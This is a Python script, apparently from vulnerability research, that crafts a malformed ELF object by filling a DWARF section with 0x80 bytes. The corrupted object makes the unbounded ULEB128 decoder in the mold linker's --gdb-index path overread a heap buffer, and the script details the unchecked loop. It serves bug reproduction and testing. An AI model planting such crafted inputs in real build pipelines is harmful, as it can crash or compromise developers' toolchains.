#!/usr/bin/env python3
"""Corrupt a DWARF section of a gcc-compiled ELF64 object so that a ULEB128
decode in mold's --gdb-index parser (read_uleb in lib/lib.h) runs off the end
of its buffer.

read_uleb has no length parameter and no bounds check:

    do {
      byte = *(*buf)++;
      val |= (byte & 0x7f) << shift;
      shift += 7;
    } while (byte & 0x80);

It keeps consuming bytes for as long as the 0x80 continuation bit is set. If a
run of 0x80-continuation bytes reaches the end of the buffer it walks past it.

With `mold --gdb-index --compress-debug-sections=zlib`, the merged .debug_abbrev
is kept in a heap buffer of exactly `sh_size` bytes (CompressedSection:
`new u8[sh_size]`, see output-chunks.cc), which ASAN instruments with a redzone,
so the overread is caught precisely at the buffer boundary.

Modes:
  fill80   overwrite the ENTIRE named section with 0x80 bytes. The first
           read_uleb over the abbrev table then never sees a cleared
           continuation bit and walks to the end of the heap buffer.
  tail80 N set the LAST N bytes of the named section to 0x80.

No pyelftools on this host; this is a bare ELF64 section-header walk (same shape
as sibling candidates 024/027).

Usage:
  corrupt_uleb.py <in.o> <out.o> <section> fill80
  corrupt_uleb.py <in.o> <out.o> <section> tail80 <N>
"""
import struct, sys


def parse_sections(data):
    e_shoff = struct.unpack_from("<Q", data, 0x28)[0]
    e_shentsize = struct.unpack_from("<H", data, 0x3a)[0]
    e_shnum = struct.unpack_from("<H", data, 0x3c)[0]
    e_shstrndx = struct.unpack_from("<H", data, 0x3e)[0]
    secs = []
    for i in range(e_shnum):
        off = e_shoff + i * e_shentsize
        name, stype, flags, addr, offset, size, link, info, align, entsize = \
            struct.unpack_from("<IIQQQQIIQQ", data, off)
        secs.append(dict(name=name, offset=offset, size=size))
    shstr_off = secs[e_shstrndx]["offset"]
    for s in secs:
        end = data.index(b"\0", shstr_off + s["name"])
        s["strname"] = data[shstr_off + s["name"]:end].decode()
    return secs


def main():
    src, dst, secname, mode = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    data = bytearray(open(src, "rb").read())
    secs = parse_sections(data)
    match = [s for s in secs if s["strname"] == secname]
    if not match:
        raise SystemExit(f"no {secname} section (have: "
                         f"{[s['strname'] for s in secs if s['strname'].startswith('.debug')]})")
    sec = match[0]
    off, size = sec["offset"], sec["size"]
    print(f"{secname}: file_off=0x{off:x} size=0x{size:x} ({size} bytes)")

    if mode == "fill80":
        for i in range(off, off + size):
            data[i] = 0x80
        print(f"  -> filled all {size} bytes with 0x80")
    elif mode == "tail80":
        n = int(sys.argv[5])
        for i in range(off + size - n, off + size):
            data[i] = 0x80
        print(f"  -> set last {n} bytes to 0x80")
    else:
        raise SystemExit(f"unknown mode {mode}")

    with open(dst, "wb") as f:
        f.write(data)
    print(f"Wrote {dst}")


if __name__ == "__main__":
    main()
